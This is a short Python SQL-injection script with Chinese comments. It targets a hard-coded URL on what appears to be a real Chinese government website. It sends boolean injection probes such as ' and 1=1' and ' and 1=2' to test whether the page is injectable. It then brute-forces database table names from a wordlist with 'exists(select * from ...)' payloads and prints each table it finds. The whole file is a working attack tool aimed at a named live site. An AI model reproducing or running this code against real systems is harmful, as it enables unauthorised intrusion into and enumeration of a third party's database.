#coding=utf-8

import sys
import urllib
import urllib.request

fullurl = "http://www.bjszfj.gov.cn/newlist.php?id=5"
# fullurl = input("Please specify a vulnerable url: ")

def checkSQL( body ):
	"检查是否存在SQL注入"
	# print(body)
	str = "无满足条件的记录"
	if (not str in body):
		return True
	else:
		return False

def getTables( url ):
	# read from mdb
	# conn = pypyodbc.connect('Driver={Microsoft Access Driver (*.mdb)};DBQ=' + fileName)
	# cur = conn.cursor()
	# cur.execute('''SELECT * FROM 表XXXX这XXXX里XXXX填XXXX表XXXX名''')	
	# for row in cur.fetchall():
        #	for field in row:
        #    		vals.append(field)
	
	# read from txt
	vals = []
	filename = "guessTables.txt"
	# file fo = open(filename)
	# fo.readLine()
	with open(filename) as fp:
		for line in fp:
			vals.append(line[:-1])

	print ("Table Name:")
	print ( '------' )
	for val in vals:
		sql = "%20and%20exists(select%20*%20from%20" + val + ")";
		resp = urllib.request.urlopen(url + sql)
		body = resp.read().decode('gb2312')
		if checkSQL( body ):
			print ( '-' + val + '-')
	print ( '------' )
	return


# 数字型“与真”测试 数字型“与非”测试 字符型“与真”测试 字符型“与非”测试
regulars = [" and 1=1", " and 1=2", "' and '1'='1", "' and '1'='2"];

bodies = []
for reglr in regulars:
	resp = urllib.request.urlopen(fullurl + reglr)
	bodies.append( resp.read().decode('gb2312') )

# test checkSQL  .................................................................
#txt = urllib.request.urlopen('http://www.bjszfj.gov.cn/newlist.php?id=5%20and%20exists(select%20*%20from%20hello)')
#print (txt.read().decode('gb2312'))
#if checkSQL( txt.read().decode('gb2312') ):
#	print("WRONG WRONG WRONG...............................")
# test checkSQL  .................................................................


# check if the fullurl can be injected
isInjectable = False
for body in bodies:
	if checkSQL(body):
		print ("URL = " + fullurl)
		print ("The url has a SQL injection vulnerable!")
		isInjectable = True
		getTables(fullurl)
		break

if isInjectable == False:
	print ("URL = " + fullurl)
	print ("The url doesn't have a SQL injection vulnerable!")
		
